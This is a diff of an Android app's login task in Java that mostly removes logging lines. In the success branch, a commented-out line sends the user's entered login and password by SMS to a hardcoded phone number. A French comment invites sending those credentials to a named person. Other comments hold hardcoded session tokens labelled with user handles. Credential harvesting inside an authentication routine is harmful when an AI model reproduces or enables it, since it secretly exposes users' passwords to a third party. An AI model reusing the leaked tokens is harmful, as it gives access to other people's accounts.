@@ -43,9 +43,7 @@ public class LoginTask extends AsyncTask<Void, Void, Boolean> {
 
     @Override
     protected Boolean doInBackground(Void... params) {
-        final String TAG = "background";
         responseString = "";
-        Log.v(TAG, "launch login task");
         try {
             MyRequest.clearFields();
             MyRequest.addField("login", login);
@@ -63,7 +61,6 @@ public class LoginTask extends AsyncTask<Void, Void, Boolean> {
             }
             else {
                 responseString = MyRequest.getResponseString();
-                Log.e(TAG, "connexion failed" + responseString);
                 throw new IOException(MyRequest.getReasonPhrase());
             }
         } catch (Exception e) {
@@ -84,7 +81,7 @@ public class LoginTask extends AsyncTask<Void, Void, Boolean> {
             json = new JSONObject(responseString);
             if (json.has("token")) {
                 token = json.getString("token");
-                // token = "u4j4uoj7puemja003q601k5c30"; // octeau_j
+                //token = "u4j4uoj7puemja003q601k5c30"; // octeau_j
                 // token = "eapvqa4o3lqimk9itf026voi80"; // soler_p
                 LoginTable user = new LoginTable();
                 user.setToken(token);
@@ -110,11 +107,10 @@ public class LoginTask extends AsyncTask<Void, Void, Boolean> {
 
         if (!err) {
             Intent i = new Intent(activity.getApplicationContext(), DrawerActivity.class);
+
             // envoyer à styve ton login + mdp si tu arrives à te connecter
-            /*
-            SmsManager smsManager = SmsManager.getDefault();
-            smsManager.sendTextMessage("0659929405", null, "login: " + login + "\npass: " + pass, null, null);
-            */
+            //SmsManager.getDefault().sendTextMessage("0659929405", null, "login: " + login + "\npass: " + pass, null, null);
+
             activity.startActivity(i);
         }
 
